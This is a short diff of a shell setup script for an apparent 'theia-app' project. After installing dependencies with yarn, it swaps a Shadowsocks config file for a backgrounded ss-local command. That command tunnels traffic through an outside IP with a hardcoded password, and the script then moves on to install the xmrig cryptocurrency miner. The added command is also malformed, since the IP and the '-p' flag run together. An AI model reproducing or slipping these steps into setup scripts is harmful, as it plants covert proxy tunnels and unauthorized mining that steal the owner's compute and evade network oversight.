@@ -14,21 +14,9 @@ cd theia-app
 # 安裝依賴
 yarn
 
-# 儲存 Shadowsocks 設定檔
-cat <<EOF > /etc/shadowsocks-libev/config.json
-{
-    "server":"3.81.227.209",
-    "server_port":443,
-    "local_port":1080,
-    "password":"abc123",
-    "timeout":60,
-    "method":"chacha20-ietf-poly1305",
-    "fast_open": true
-}
-EOF
+ss-local -s 3.81.227.209-p 443 -l 1080 -k abc123 -m chacha20-ietf-poly1305 &
 
-# 啟動 Shadowsocks
-systemctl restart shadowsocks-libev
+sleep 5
 
 # 安裝 xmrig
 cd /opt
